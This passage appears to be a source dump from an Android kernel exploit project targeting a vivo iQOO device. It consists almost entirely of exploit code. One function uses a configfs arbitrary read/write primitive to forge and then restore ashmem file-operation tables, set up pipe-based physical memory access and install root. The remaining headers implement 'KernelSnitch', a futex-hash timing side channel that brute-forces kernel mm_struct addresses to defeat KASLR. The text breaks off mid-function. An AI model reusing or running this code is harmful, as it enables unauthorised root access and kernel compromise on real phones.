      fd, boot_id_data_ptr, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data_ptr, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data_ptr, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;

#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type = (data_addr_canonical
      ? kaslr_base + SLIDE_NFULNL_LOGGER_OBJECT_OFF
      : SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset) + sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_restore_ret =
      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info("slide restore rb parent type pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), type_restore_ret,
          (unsigned long long)type_before,
          (unsigned long long)type_want,
          (unsigned long long)type_after, errno);
  return boot_id_restored &&
         type_restore_ret == (ssize_t)sizeof(type_want) &&
         type_after == type_want;
#else
  return boot_id_restored;
#endif
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  /* The stack writer may already have replaced the global misc fops before
   * this verifier opens its fd.  Treat the route as dirty from this point so
   * an early ETXTBSY/plant-shape failure still attempts to restore the global
   * slot instead of leaving a malformed table behind. */
  int dirty = 1;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
               "read=%016llx want=%016zx errno=%d\n",
               pre_rb, misc_fops, (unsigned long long)pre_fops,
               fake_fops, errno);
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!audit_fake_fops_table(fd)) {
    cfi_last_step = 12;
    cfi_last_errno = errno;
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  unsigned char payload_before[sizeof(payload)];
  if (!one_page_span(binwrite_target, sizeof(payload)) ||
      configfs_read_once(fd, binwrite_target, payload_before,
                         sizeof(payload_before)) !=
          (ssize_t)sizeof(payload_before)) {
    cfi_last_step = 13;
    cfi_last_errno = errno;
    goto fail;
  }
  for (size_t i = 0; i < sizeof(payload_before); ++i) {
    if (payload_before[i] != 0) {
      pr_warning("cfi scratch not zero target=%016zx off=0x%zx value=0x%02x\n",
                 binwrite_target, i, payload_before[i]);
      cfi_last_step = 13;
      cfi_last_errno = 0;
      goto fail;
    }
  }
  pr_info("cfi scratch span=%016zx-%016zx old=zero size=%zu\n",
          binwrite_target, binwrite_target + sizeof(payload) - 1,
          sizeof(payload));
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  /* A short/positive pwrite result only proves that configfs consumed the
   * userspace iterator.  It does not prove that the forged bin_buffer still
   * points at the intended kernel address.  Read the scratch bytes back
   * before attempting the fops repair, otherwise a failed primitive can
   * leave ashmem_misc.fops corrupted and crash an unrelated opener later. */
  unsigned char scratch_after[sizeof(payload)];
  memset(scratch_after, 0, sizeof(scratch_after));
  ssize_t scratch_rb = configfs_read_once(
      fd, binwrite_target, scratch_after, sizeof(scratch_after));
  int scratch_read_errno = errno;
  uint64_t scratch_word = 0;
  memcpy(&scratch_word, scratch_after, sizeof(scratch_word));
  pr_info("cfi scratch readback ret=%zd match=%d first=%016llx errno=%d\n",
          scratch_rb,
          scratch_rb == (ssize_t)sizeof(scratch_after) &&
              memcmp(scratch_after, payload, sizeof(payload)) == 0,
          (unsigned long long)scratch_word,
          scratch_read_errno);
  if (scratch_rb != (ssize_t)sizeof(scratch_after) ||
      memcmp(scratch_after, payload, sizeof(payload)) != 0) {
    cfi_last_step = 14;
    cfi_last_errno = scratch_read_errno;
    goto fail;
  }

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (!restore_p0_oracle_pages(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
          misc_fops, (unsigned long long)original_fops);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != original_fops) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  if (!kaslr_done) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

#if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
  if (!fake_fops_owner_is_zero(fd)) {
    cfi_last_step = 7;
    cfi_last_errno = errno;
    goto fail;
  }
  SYSCHK(close(fd));
  cfi_last_step = 0;
  cfi_last_errno = 0;
  atomic_store(&cfi_stage_done, 1);
  pr_success("QEMU_STACK_WRITER_OK backend reached verified configfs ARW\n");
  return 1;
#endif

  pr_info("cfi starting pipe physrw\n");

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (getenv("P0_ORACLE_DIAG")) {
    int diagnostic_ok = run_p0_pipe_oracle_diagnostic(fd);
    fflush(NULL);
    _exit(diagnostic_ok ? 0 : 1);
  }
#endif

#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
  pipebuf_page_base = prepare_pipe_buffer_page();
  pr_info("fresh physrw pipe after verified fops page=%016zx\n",
          pipebuf_page_base);
  if (!is_direct_ptr(pipebuf_page_base)) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
      pipebuf_page_base = prepare_pipe_buffer_page();
      pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
              attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
      if (!is_direct_ptr(pipebuf_page_base)) {
        continue;
      }
#endif
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  int owner_ok = fake_fops_owner_is_zero(fd);
  SYSCHK(close(fd));
  if (owner_ok &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    uint64_t after_fail = 0;
    ssize_t restore_rb = -1;
    int restore_errno = 0;
    /* Always verify the rollback, including failures before can_read_back is
     * set.  The old gate hid exactly the case that left the global misc fops
     * slot stale across the failed attempt. */
    for (int retry = 0; retry < 3; retry++) {
      cfi_restore_ret = configfs_write_once(
          fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
      int write_errno = errno;
      memset(&after_fail, 0, sizeof(after_fail));
      restore_rb = configfs_read_once(
          fd, misc_fops, &after_fail, sizeof(after_fail));
      restore_errno = errno;
      pr_info("cfi restore attempt=%d wr=%zd rd=%zd after=%016llx "
              "want=%016llx write_errno=%d read_errno=%d\n",
              retry + 1, cfi_restore_ret, restore_rb,
              (unsigned long long)after_fail,
              (unsigned long long)original_fops_fail,
              write_errno, restore_errno);
      if (restore_rb == (ssize_t)sizeof(after_fail) &&
          after_fail == original_fops_fail) {
        fops_after = after_fail;
        break;
      }
    }
    if (restore_rb == (ssize_t)sizeof(after_fail)) {
      fops_after = after_fail;
    }
    fake_fops_owner_is_zero(fd);
  }
  SYSCHK(close(fd));
  return 0;
}

```

---

## kernelsnitch/futex_hash.h

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/kernelsnitch/futex_hash.h`

```c
#pragma once

#include "utils.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <sys/time.h>

// --------------- ADDED/REPLACED FOR COMPATIBILITY ---------------
typedef uint32_t u32;
typedef uint32_t __u32;
typedef uint8_t u8;

// #include <linux/bitops.h>
static inline __u32 rol32(__u32 word, unsigned int shift)
{
    return (word << (shift & 31)) | (word >> ((-shift) & 31));
}

#define fallthrough __attribute__((fallthrough));
// --------------- ADDED/REPLACED FOR COMPATIBILITY ---------------

/* jhash.h: Jenkins hash support.
 *
 * Copyright (C) 2006. Bob Jenkins (bob_jenkins@burtleburtle.net)
 *
 * https://burtleburtle.net/bob/hash/
 *
 * These are the credits from Bob's sources:
 *
 * lookup3.c, by Bob Jenkins, May 2006, Public Domain.
 *
 * These are functions for producing 32-bit hashes for hash table lookup.
 * hashword(), hashlittle(), hashlittle2(), hashbig(), mix(), and final()
 * are externally useful functions.  Routines to test the hash are included
 * if SELF_TEST is defined.  You can use this free for any purpose.  It's in
 * the public domain.  It has no warranty.
 *
 * Copyright (C) 2009-2010 Jozsef Kadlecsik (kadlec@blackhole.kfki.hu)
 *
 * I've modified Bob's hash to be useful in the Linux kernel, and
 * any bugs present are my fault.
 * Jozsef
 */
// #include <linux/bitops.h>
// #include <linux/unaligned/packed_struct.h>

/* Best hash sizes are of power of two */
#define jhash_size(n)   ((u32)1<<(n))
/* Mask the hash value, i.e (value & jhash_mask(n)) instead of (value % n) */
#define jhash_mask(n)   (jhash_size(n)-1)

/* __jhash_mix -- mix 3 32-bit values reversibly. */
#define __jhash_mix(a, b, c)            \
{                        \
    a -= c;  a ^= rol32(c, 4);  c += b;    \
    b -= a;  b ^= rol32(a, 6);  a += c;    \
    c -= b;  c ^= rol32(b, 8);  b += a;    \
    a -= c;  a ^= rol32(c, 16); c += b;    \
    b -= a;  b ^= rol32(a, 19); a += c;    \
    c -= b;  c ^= rol32(b, 4);  b += a;    \
}

/* __jhash_final - final mixing of 3 32-bit values (a,b,c) into c */
#define __jhash_final(a, b, c)            \
{                        \
    c ^= b; c -= rol32(b, 14);        \
    a ^= c; a -= rol32(c, 11);        \
    b ^= a; b -= rol32(a, 25);        \
    c ^= b; c -= rol32(b, 16);        \
    a ^= c; a -= rol32(c, 4);        \
    b ^= a; b -= rol32(a, 14);        \
    c ^= b; c -= rol32(b, 24);        \
}

/* An arbitrary initial parameter */
#define JHASH_INITVAL        0xdeadbeef

/* jhash - hash an arbitrary key
 * @k: sequence of bytes as key
 * @length: the length of the key
 * @initval: the previous hash, or an arbitray value
 *
 * The generic version, hashes an arbitrary sequence of bytes.
 * No alignment or length assumptions are made about the input key.
 *
 * Returns the hash value of the key. The result depends on endianness.
 */


/* jhash2 - hash an array of u32's
 * @k: the key which must be an array of u32's
 * @length: the number of u32's in the key
 * @initval: the previous hash, or an arbitray value
 *
 * Returns the hash value of the key.
 */
static inline u32 jhash2(const u32 *k, u32 length, u32 initval)
{

    u32 a, b, c;

    /* Set up the internal state */
    a = b = c = JHASH_INITVAL + (length<<2) + initval;

    /* Handle most of the key */
    while (length > 3) {
        a += k[0];
        b += k[1];
        c += k[2];
        __jhash_mix(a, b, c);
        length -= 3;
        k += 3;
    }

    /* Handle the last 3 u32's: all the case statements fall through */
    switch (length) {
    case 3: c += k[2];    fallthrough;
    case 2: b += k[1];    fallthrough;
    case 1: a += k[0];
        __jhash_final(a, b, c);
    case 0:    /* Nothing left to add */
        break;
    }

    return c;
}

/* __jhash_nwords - hash exactly 3, 2 or 1 word(s) */
static inline u32 __jhash_nwords(u32 a, u32 b, u32 c, u32 initval)
{
    a += initval;
    b += initval;
    c += initval;

    __jhash_final(a, b, c);

    return c;
}

static inline u32 jhash_3words(u32 a, u32 b, u32 c, u32 initval)
{
    return __jhash_nwords(a, b, c, initval + JHASH_INITVAL + (3 << 2));
}

static inline u32 jhash_2words(u32 a, u32 b, u32 initval)
{
    return __jhash_nwords(a, b, 0, initval + JHASH_INITVAL + (2 << 2));
}

static inline u32 jhash_1word(u32 a, u32 initval)
{
    return __jhash_nwords(a, 0, 0, initval + JHASH_INITVAL + (1 << 2));
}

#define OFFSET_OF(TYPE, FIELD) ((size_t) &((TYPE *)0)->FIELD)
#ifndef KS_PAGE_MASK
#define KS_PAGE_MASK 0xfffULL
#endif

#define FUTEX_KEY_INIT (union futex_key) { .both = { .ptr = 0ULL } }

typedef union {
    struct {
        uint64_t i_seq;
        unsigned long pgoff;
        unsigned int offset;
    } shared;
    struct {
        union {
            // struct mm_struct *mm;
            void *mm;
            uint64_t __tmp;
        };
        unsigned long address;
        unsigned int offset;
    } private;
    struct {
        uint64_t ptr;
        unsigned long word;
        unsigned int offset;
    } both;
} futex_key_t;

uint32_t futex_hash_no_trunc(futex_key_t *key)
{
    uint32_t hash = jhash2((uint32_t *)key, OFFSET_OF(typeof(*key), both.offset) / 4,
              key->both.offset);

    return hash;
}

uint32_t __futex_hash(futex_key_t *key, uint32_t futex_hashsize)
{
    uint32_t hash = futex_hash_no_trunc(key);

    return hash & (futex_hashsize-1);
}

unsigned long futex_hashsize = (unsigned long)-1;
void futex_init(void)
{
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#ifdef KERNELSNITCH_FUTEX_HASH_SIZE
    futex_hashsize = KERNELSNITCH_FUTEX_HASH_SIZE;
#else
    unsigned long requested = SYSCHK(sysconf(_SC_NPROCESSORS_ONLN)) * 256;
    futex_hashsize = 1;
    while (futex_hashsize < requested)
        futex_hashsize <<= 1;
#endif
#else
    futex_hashsize = SYSCHK(sysconf(_SC_NPROCESSORS_ONLN) * 256);
#endif
}
uint32_t futex_hash(size_t addr, size_t mm)
{
    ASSERT_pr((futex_hashsize != (unsigned long)-1), "need to call futex_init() first\n");
    futex_key_t key;
    key.private.mm = (void *)mm;
    key.private.address = addr & ~KS_PAGE_MASK;
    key.private.offset = addr & KS_PAGE_MASK;
    return __futex_hash(&key, futex_hashsize);
}

```

---

## kernelsnitch/kernelsnitch.h

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/kernelsnitch/kernelsnitch.h`

```c
#pragma once

#include "timeutils.h"
#include "utils.h"
#include "futex_hash.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <limits.h>

#define FUTEX_SZ (64ULL<<30)
#define FUTEX_MMAP_SZ (1ULL<<30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef KS_PAGE_SIZE
#define KS_PAGE_SIZE PAGE_SIZE
#endif
#ifndef APPENDED_FUTEXES
#define APPENDED_FUTEXES 4096
#endif
#define MULITPLE 4
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL<<30))
#endif
#define IDENTITY_START KERNELSNITCH_IDENTITY_START
#define IDENTITY_END   KERNELSNITCH_IDENTITY_END
#define COARSE_SZ (1ULL << 30)

enum kernelsnitch_state {
    KERNELSNITCH_NOT_INIT = 0,
    KERNELSNITCH_INIT,
    KERNELSNITCH_COLLISIONS_FOUND,
    KERNELSNITCH_COLLISIONS_NOT_FOUND,
    KERNELSNITCH_MM_FOUND,
    KERNELSNITCH_MM_NOT_FOUND,
    KERNELSNITCH_LAST,
};

struct kernelsnitch_shared_state {
    volatile size_t mm_struct_sz;
    volatile size_t mm_slab_order;
    volatile size_t verbose;

    size_t collisions;
    size_t thread_cnt;
    size_t cpu_cnt;
    size_t futex_hash_table_size;
    size_t total_futexes;
    size_t appended_futexes;
    size_t repeat_measurement;
    size_t average;

    volatile unsigned char *futexes;
    volatile unsigned char inc_futex[KS_PAGE_SIZE];

    volatile size_t *futex_addrs;
    volatile size_t *times;
    volatile size_t found;
    volatile size_t mm_struct;

    pthread_t *tids;
    pthread_t *increase_tids;
    size_t increase_count;
    size_t increase_id;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    size_t identity_start;
    size_t identity_end;
#endif
    size_t identity_diff;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    size_t min_object_index;
    size_t max_object_index;
    int exact_identity_partition;
#endif

    enum kernelsnitch_state state;

    int mte_enabled;
};

#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)

/**
 * FUTEX syscall
 */
static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

/**
 * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the increase
 */
struct inc_arg {
    struct kernelsnitch_shared_state *ks;
    size_t id;
};
static void *__do_increase(void *arg)
{
    struct inc_arg *inc_arg = (struct inc_arg *)arg;
    struct kernelsnitch_shared_state *ks = inc_arg->ks;
    size_t id = inc_arg->id;
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
    free(inc_arg);
    return 0;
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg amount: increase
 */
static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
{
    ks->increase_tids = calloc(amount, sizeof(*ks->increase_tids));
    ASSERT_pr((ks->increase_tids != NULL), "failed to allocate futex waiter ids\n");
    ks->increase_count = amount;
    ks->increase_id = id;
    for (size_t i = 0; i < amount; ++i) {
        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
        inc_arg->id = id;
        inc_arg->ks = ks;
        SYSCHK(pthread_create(&ks->increase_tids[i], 0, __do_increase,
                              (void *)inc_arg));
    }
    WAIT();
}

static void __decrease(struct kernelsnitch_shared_state *ks)
{
    if (!ks->increase_tids)
        return;
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[ks->increase_id],
                   FUTEX_WAKE_PRIVATE, INT_MAX, NULL, NULL, 0));
    for (size_t i = 0; i < ks->increase_count; ++i)
        SYSCHK(pthread_join(ks->increase_tids[i], NULL));
    free(ks->increase_tids);
    ks->increase_tids = NULL;
    ks->increase_count = 0;
}

/**
 * Simple compare
 */
#ifndef REPEAT_MEASUREMENT
#define REPEAT_MEASUREMENT 128
#endif
#ifndef AVERAGE
#define AVERAGE (1<<3)
#endif
static int __compare(const void *a, const void *b)
{
    return (*(size_t *)a - *(size_t *)b);
}

/**
 * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
 * @return averaged time of the futex wait operation
 */
static size_t __measure(
    struct kernelsnitch_shared_state *ks, size_t futex_addr)
{
    size_t t0;
    size_t t1;
    size_t time = 0;
    // do some simple signal processing and reject bad ones
    size_t __times[REPEAT_MEASUREMENT];
    for (size_t l = 0; l < ks->repeat_measurement; ++l) {
        sched_yield();
        t0 = rdtsc_begin();
        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
        t1 = rdtsc_end();
        __times[l] = t1 - t0;
    }
    qsort(__times, ks->repeat_measurement, sizeof(size_t), __compare);
    for (size_t l = 0; l < ks->average; ++l)
        time += __times[l];
    time /= ks->average;
    return time;
}

/**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
struct range {
    size_t id;
    size_t start;
    size_t end;
};
struct mm_leak_arg {
    struct kernelsnitch_shared_state *ks;
    struct range range;
};
static void *__mm_leak(void *arg)
{
    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
    struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
    struct range *range = &mm_leak_arg->range;
    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
        if ((coarse_addr % (1ULL << 40)) == 0)
            if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
        size_t coarse_end = coarse_addr + COARSE_SZ;
        if (ks->exact_identity_partition && coarse_end > range->end)
            coarse_end = range->end;
        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
            size_t first_candidate =
                slab_addr + ks->min_object_index * ks->mm_struct_sz;
            size_t candidate_end =
                slab_addr + (ks->max_object_index + 1) * ks->mm_struct_sz;
            if (candidate_end > slab_addr + mm_slab_sz)
                candidate_end = slab_addr + mm_slab_sz;
            for (size_t mm_struct_candidate = first_candidate; (mm_struct_candidate < candidate_end) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
#else
        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
#endif

                size_t found_hash = 1;
                if (!ks->mte_enabled) {
                    // test the mm_struct candidate
                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                        found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
                    if (found_hash) {
                        ks->mm_struct = mm_struct_candidate;
                        ks->found = 1;
                        break;
                    }
                } else {
                    // need to set the tag if mte is enabled
                    for (size_t tag_candidate = 0;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
                         tag_candidate < 16 && !ks->found;
#else
                         tag_candidate < 15 && !ks->found;
#endif
                         ++tag_candidate) {
                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                        __mm_struct_candidate |= (tag_candidate << 56);
                        found_hash = 1;
                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                        if (found_hash) {
                            if (ks->verbose)
                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
                            ks->mm_struct = __mm_struct_candidate;
                            ks->found = 1;
                            break;
                        }
                    }
                }
            }
        }
    }
    free(mm_leak_arg);
    return 0;
}

/****************************************************************************************************************/
/* EXTERNAL FUNCTIONS                                                                                           */
/****************************************************************************************************************/

/**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return shared KernelSnitch state
 */
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->mm_struct = -1;
    ks->mm_struct_sz = __mm_struct_sz;
    ks->mm_slab_order = __mm_slab_order;
    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
    ks->thread_cnt = __thread_cnt;
    ks->collisions = __collision_cnt;
    ks->verbose = __verbose;
    ks->mte_enabled = __mte_enabled;
    ks->appended_futexes = APPENDED_FUTEXES;
    ks->repeat_measurement = REPEAT_MEASUREMENT;
    ks->average = AVERAGE;

    // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
    ks->futex_hash_table_size = 256*ks->cpu_cnt;
    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
    ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
    for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    ks->identity_start = IDENTITY_START;
    ks->identity_end = IDENTITY_END;
    ks->identity_diff =
        (ks->identity_end - ks->identity_start) / ks->thread_cnt;
    ks->min_object_index = 0;
    ks->max_object_index =
        ((KS_PAGE_SIZE << ks->mm_slab_order) / ks->mm_struct_sz) - 1;
    ks->exact_identity_partition = 0;
#else
    ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);
#endif

    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));

    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
        ks->cpu_cnt,
        ks->mm_struct_sz,
        ks->mm_slab_order,
        ks->thread_cnt,
        ks->collisions,
        ks->mte_enabled ? "enabled" : "disabled");
    pin_to_core(0);
    futex_init();

    ks->state = KERNELSNITCH_INIT;
    return ks;
}

void kernelsnitch_set_profile(
    struct kernelsnitch_shared_state *ks, size_t appended_futexes,
    size_t repeat_measurement, size_t average)
{
    ASSERT_pr((appended_futexes > 0), "invalid appended futex count\n");
    ASSERT_pr((repeat_measurement > 0 &&
               repeat_measurement <= REPEAT_MEASUREMENT),
